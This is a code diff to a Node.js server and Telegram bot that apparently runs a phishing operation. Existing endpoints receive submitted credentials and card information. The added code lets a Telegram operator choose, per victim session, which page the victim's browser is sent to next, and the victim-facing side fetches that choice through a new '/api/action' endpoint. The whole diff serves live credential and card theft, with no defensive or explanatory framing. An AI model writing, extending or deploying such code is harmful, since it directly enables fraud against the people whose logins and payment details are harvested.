@@ -21,6 +21,7 @@ const bot = new TelegramBot(config.token, { polling: true });
 
 // Path to the user data JSON file
 const userDataPath = path.join(__dirname, 'userData.json');
+const routesDataPath = path.join(__dirname, 'routes.json');
 
 // Function to read user data from the JSON file
 const readUserData = () => {
@@ -35,6 +36,22 @@ const readUserData = () => {
 // Function to write user data to the JSON file
 const writeUserData = (data) => {
     fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
+};
+
+
+// Function to read routes data from the JSON file
+const readRoutesData = () => {
+    if (fs.existsSync(routesDataPath)) {
+        const data = fs.readFileSync(routesDataPath);
+        if (data.length === 0) return {}; // Handle empty file
+        return JSON.parse(data);
+    }
+    return {};
+};
+
+// Function to write routes data to the JSON file
+const writeRoutesData = (data) => {
+    fs.writeFileSync(routesDataPath, JSON.stringify(data, null, 2));
 };
 
 // Test the bot by sending a message to the chat ID
@@ -84,6 +101,30 @@ app.post('/api/cred', upload.none(), (req, res) => {
 
     // Send response to client
     res.status(200).json({ message: 'Credentials received successfully' });
+});
+
+app.post('/api/action', (req, res) => {
+    const { sessionId } = req.body;
+
+    // Читаем данные маршрутов
+    const routes = readRoutesData();
+
+    // Проверяем, существует ли sessionId в данных маршрутов
+    if (!routes[sessionId]) {
+        return res.status(404).json({ message: 'Session not found' });
+    }
+
+    // Если sessionId существует, отправляем соответствующее действие
+    const action = routes[sessionId].action; // Получаем action
+    delete routes[sessionId]; // Удаляем action из файла
+    writeRoutesData(routes); // Сохраняем изменения
+
+    const response = {
+        action: action,
+        sessionId: sessionId,
+    };
+
+    res.status(200).json(response);
 });
 
 // Endpoint for handling card information
@@ -214,20 +255,18 @@ bot.on('callback_query', (callbackQuery) => {
     const action = data[0];
     const sessionId = data[1];
 
-    // Log the action and sessionId to the console
+    // Логируем действие и sessionId
     console.log(`Отправляем на: ${action}`);
 
-    // Read existing user data
-    //const users = readUserData();
+    // Сохраняем action в routes.json
+    const routes = readRoutesData();
+    routes[sessionId] = { action: action }; // Сохраняем action для sessionId
+    writeRoutesData(routes); // Сохраняем изменения
 
-    // Return JSON response
-    const response = {
-        action: action,
-        sessionId: sessionId,
-    };
-    console.log(JSON.stringify(response));
+    // Отправляем ответ пользователю
     bot.sendMessage(callbackQuery.message.chat.id, `Отправляем на: ${action}`);
 });
+
 
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
